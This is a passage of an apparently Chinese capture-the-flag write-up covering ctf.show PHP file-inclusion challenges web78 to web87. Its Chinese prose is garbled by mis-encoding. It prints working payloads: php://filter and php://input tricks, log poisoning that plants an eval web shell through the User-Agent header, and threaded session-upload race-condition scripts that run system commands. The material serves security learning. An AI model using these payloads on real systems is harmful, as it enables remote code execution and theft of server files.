class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂºÄÂßãÊñá‰ª∂ÂåÖÂê´ÁöÑÈ¢òÂûã‰∫ÜÔºåËøôÈáå‰ΩøÁî®php‰º™ÂçèËÆÆphp://filterÊù•ÊûÑÈÄ†paylaod</p><blockquote><p>È¶ñÂÖàËøôÊòØ‰∏Ä‰∏™fileÂÖ≥ÈîÆÂ≠óÁöÑgetÂèÇÊï∞‰º†ÈÄíÔºåphp://ÊòØ‰∏ÄÁßçÂçèËÆÆÂêçÁß∞Ôºåphp://filter/ÊòØ‰∏ÄÁßçËÆøÈóÆÊú¨Âú∞Êñá‰ª∂ÁöÑÂçèËÆÆÔºå/read=convert.base64-encode/Ë°®Á§∫ËØªÂèñÁöÑÊñπÂºèÊòØbase64ÁºñÁ†ÅÂêéÔºåresource=index.phpË°®Á§∫ÁõÆÊ†áÊñá‰ª∂‰∏∫index.php„ÄÇ</p><p>ÈÄöËøá‰º†ÈÄíËøô‰∏™ÂèÇÊï∞ÂèØ‰ª•ÂæóÂà∞index.phpÁöÑÊ∫êÁ†ÅÔºå‰∏ãÈù¢ËØ¥ËØ¥‰∏∫‰ªÄ‰πàÔºåÁúãÂà∞Ê∫êÁ†Å‰∏≠ÁöÑincludeÂáΩÊï∞ÔºåËøô‰∏™Ë°®Á§∫‰ªéÂ§ñÈÉ®ÂºïÂÖ•phpÊñá‰ª∂Âπ∂ÊâßË°åÔºåÂ¶ÇÊûúÊâßË°å‰∏çÊàêÂäüÔºåÂ∞±ËøîÂõûÊñá‰ª∂ÁöÑÊ∫êÁ†Å„ÄÇ</p><p>ËÄåincludeÁöÑÂÜÖÂÆπÊòØÁî±Áî®Êà∑ÊéßÂà∂ÁöÑÔºåÊâÄ‰ª•ÈÄöËøáÊàë‰ª¨‰º†ÈÄíÁöÑfileÂèÇÊï∞ÔºåÊòØincludeÔºàÔºâÂáΩÊï∞ÂºïÂÖ•‰∫Üindex.phpÁöÑbase64ÁºñÁ†ÅÊ†ºÂºèÔºåÂõ†‰∏∫ÊòØbase64ÁºñÁ†ÅÊ†ºÂºèÔºåÊâÄ‰ª•ÊâßË°å‰∏çÊàêÂäüÔºåËøîÂõûÊ∫êÁ†ÅÔºåÊâÄ‰ª•Êàë‰ª¨ÂæóÂà∞‰∫ÜÊ∫êÁ†ÅÁöÑbase64Ê†ºÂºèÔºåËß£Á†ÅÂç≥ÂèØ„ÄÇ</p></blockquote><p>payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>ËØªÂèñÂá∫Êù•ÊòØbase64ÔºåÂÜçÊãøÂéªËøõË°åbase64Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web79"><a class="header-anchor" href="#web79">¬∂</a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääphpÂíåÈÄöÈÖçÁ¨¶ËøáÊª§‰∫ÜÔºåphp‰º™ÂçèËÆÆÂ§ßÂ∞èÂÜôÂèØ‰ª•ÁªïËøáÔºåÊâÄ‰ª•Êàë‰ª¨ËøôÈáå‰ΩøÁî®php://input‰º™ÂçèËÆÆÔºåpaylaodÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">postÔºö&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web79/0C4K%40R_MQ2W%282D%40VEF%7DHV37.png" alt=""></p><h3 id="web80"><a class="header-anchor" href="#web80">¬∂</a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â§öËøáÊª§‰∫Ü‰∏Ä‰∏™dataÔºåÂèØ‰ª•ÁªßÁª≠‰ΩøÁî®‰∏äÈ¢òphp:inputÂçèËÆÆÔºå‰∏çËøáÊ≥®ÊÑèËøôÊ¨°Êñá‰ª∂ÂêçÂ≠óÊîπ‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/~4EFI%24V_L~8E%24U_CGIDW5%5D1.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/YG%60%7DUF%5D%5D~P6HJ%40~2KA4%5D949.png" alt=""><br>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">postÔºö&lt;?php system(&quot;tac fl0g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web81"><a class="header-anchor" href="#web81">¬∂</a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Êää:Áªôban‰∫ÜÔºåÈ¢òÁõÆÊèêÁ§∫‰ΩøÁî®Êó•ÂøóÂåÖÂê´Ôºå‰πãÂâçÈÉΩÊòØÊâãÂ∑•ÂèëÂåÖÔºåËøôÊ¨°ÂÜô‰∏™ËÑöÊú¨Êù•Ë∑ë</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 19:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://893b0ed2-2497-41f3-b056-c5617165c2f3.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.get(url=url, headers=headers)</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂæóÂà∞flag</p><h3 id="web82"><a class="header-anchor" href="#web82">¬∂</a>web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Êää<code>.</code>ÁªôËøáÊª§‰∫ÜÔºåÊó•ÂøóÂåÖÂê´‰ΩøÁî®‰∏ç‰∫ÜÔºåÊàë‰ª¨‰ΩøÁî®sessionÊñá‰ª∂ÂåÖÂê´ÔºåÂÖà‰∫ÜËß£‰∏Ä‰∫õÁü•ËØÜÁÇπÔºåÂú®php5.4‰πãÂêéphp.iniÂºÄÂßãÊúâÂá†‰∏™ÈªòËÆ§ÈÄâÈ°π</p><blockquote><p>1.session.upload_progress.enabled = on<br>2.session.upload_progress.cleanup = on<br>3.session.upload_progress.prefix = ‚Äúupload_progress_‚Äù<br>4.session.upload_progress.name = ‚ÄúPHP_SESSION_UPLOAD_PROGRESS‚Äù<br>5.session.use_strict_mode=off</p><p>Á¨¨‰∏Ä‰∏™Ë°®Á§∫ÂΩìÊµèËßàÂô®ÂêëÊúçÂä°Âô®‰∏ä‰º†‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåphpÂ∞Ü‰ºöÊääÊ≠§Ê¨°Êñá‰ª∂‰∏ä‰º†ÁöÑËØ¶ÁªÜ‰ø°ÊÅØ(Â¶Ç‰∏ä‰º†Êó∂Èó¥„ÄÅ‰∏ä‰º†ËøõÂ∫¶Á≠â)Â≠òÂÇ®Âú®sessionÂΩì‰∏≠<br>Á¨¨‰∫å‰∏™Ë°®Á§∫ÂΩìÊñá‰ª∂‰∏ä‰º†ÁªìÊùüÂêéÔºåphpÂ∞Ü‰ºöÁ´ãÂç≥Ê∏ÖÁ©∫ÂØπÂ∫îsessionÊñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ<br>Á¨¨‰∏âÂíåÁ¨¨Âõõ‰∏™<code>prefix+name</code>Â∞ÜË°®Á§∫‰∏∫session‰∏≠ÁöÑÈîÆÂêç<br>Á¨¨‰∫î‰∏™Ë°®Á§∫Êàë‰ª¨ÂØπCookie‰∏≠sessionIDÂèØÊéß</p></blockquote><p>ÁÆÄËÄåË®Ä‰πãÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®<code>session.upload_progress</code>Â∞ÜÊú®È©¨ÂÜôÂÖ•sessionÊñá‰ª∂ÔºåÁÑ∂ÂêéÂåÖÂê´Ëøô‰∏™sessionÊñá‰ª∂„ÄÇ‰∏çËøáÂâçÊèêÊòØÊàë‰ª¨ÈúÄË¶ÅÂàõÂª∫‰∏Ä‰∏™sessionÊñá‰ª∂ÔºåÂπ∂‰∏îÁü•ÈÅìsessionÊñá‰ª∂ÁöÑÂ≠òÊîæ‰ΩçÁΩÆ„ÄÇÂõ†‰∏∫<code>session.use_strict_mode=off</code>ÁöÑÂÖ≥Á≥ªÔºåÊàë‰ª¨ÂèØ‰ª•Ëá™ÂÆö‰πâsessionID<br>linuxÁ≥ªÁªü‰∏≠sessionÊñá‰ª∂‰∏ÄËà¨ÁöÑÈªòËÆ§Â≠òÂÇ®‰ΩçÁΩÆ‰∏∫ /tmp Êàñ /var/lib/php/session</p><p>‰æãÂ¶ÇÊàë‰ª¨Âú®Cookie‰∏≠ËÆæÁΩÆ‰∫ÜPHPSESSID=flagÔºåphp‰ºöÂú®ÊúçÂä°Âô®‰∏äÂàõÂª∫Êñá‰ª∂Ôºö/tmp/sess_flagÔºåÂç≥‰ΩøÊ≠§Êó∂Áî®Êà∑Ê≤°ÊúâÂàùÂßãÂåñsessionÔºåphp‰πü‰ºöËá™Âä®ÂàùÂßãÂåñSession„ÄÇ Âπ∂‰∫ßÁîü‰∏Ä‰∏™ÈîÆÂÄºÔºå‰∏∫<code>prefix+name</code>ÁöÑÂÄºÔºåÊúÄÂêéË¢´ÂÜôÂÖ•sess_Êñá‰ª∂Èáå<br>ËøòÊúâ‰∏Ä‰∏™ÂÖ≥ÈîÆÁÇπÂ∞±ÊòØ<code>session.upload_progress.cleanup</code>ÈªòËÆ§ÊòØÂºÄÂêØÁöÑÔºåÂè™Ë¶ÅËØªÂèñ‰∫ÜpostÊï∞ÊçÆÔºåÂ∞±‰ºöÊ∏ÖÈô§ËøõÂ∫¶‰ø°ÊÅØÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂà©Áî®Êù°‰ª∂Á´û‰∫âÊù•passÔºåÂÜô‰∏Ä‰∏™ËÑöÊú¨Êù•ÂÆåÊàê</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    write = threading.Thread(target=write, args=(session,))</span><br><span class="line">    write.daemon = <span class="literal">True</span></span><br><span class="line">    write.start()</span><br><span class="line">    read(session)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web82/S%29PR%28L6K%282%5B1%29_%5DKLZAS8%5BM.png" alt=""></p><h3 id="web83"><a class="header-anchor" href="#web83">¬∂</a>web83</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁªßÁª≠Âà©Áî®sessionÊñá‰ª∂ÂåÖÂê´Ôºå‰ΩøÁî®‰∏äÈ¢òËÑöÊú¨ËøêË°åÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web84"><a class="header-anchor" href="#web84">¬∂</a>web84</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âä†‰∫Ü‰∏Ä‰∏™<code>rm -rf</code>Ôºå‰ΩÜÊ≤°ÂÖ≥Á≥ªÔºåÊàë‰ª¨ÊòØÊù°‰ª∂Á´û‰∫âÔºåÂè™Ë¶Å‰∏ÄÁõ¥‰º†Â∞±ÊúâÊú∫‰ºöËÉΩÊâßË°åÔºåÁªßÁª≠Ë∑ë‰∏äÈù¢ÁöÑËÑöÊú¨Êãøflag</p><h3 id="web85"><a class="header-anchor" href="#web85">¬∂</a>web85</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°‰ºöÂåπÈÖçË∞ÉÁî®dieÔºåÊàë‰ª¨‰æùÁÑ∂‰ΩøÁî®Êù°‰ª∂Á´û‰∫âËøõË°åpassÔºå‰∏çËøáËøôÊ¨°Êàë‰ª¨Â§öÂä†ÁÇπÁ∫øÁ®ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://8c42100f-3744-4c9f-83d4-5ac626e78719.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞flag</p><h3 id="web86"><a class="header-anchor" href="#web86">¬∂</a>web86</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;ËøòË¶ÅÁßÄÔºü&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(ËøòË¶ÅÁßÄÔºü);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁªßÁª≠‰ΩøÁî®‰∏äÈ¢òËÑöÊú¨Ë∑ëÔºåË∑ëÂÆåÂæóÂà∞flag</p><h3 id="web87"><a class="header-anchor" href="#web87">¬∂</a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">&quot;&lt;?php 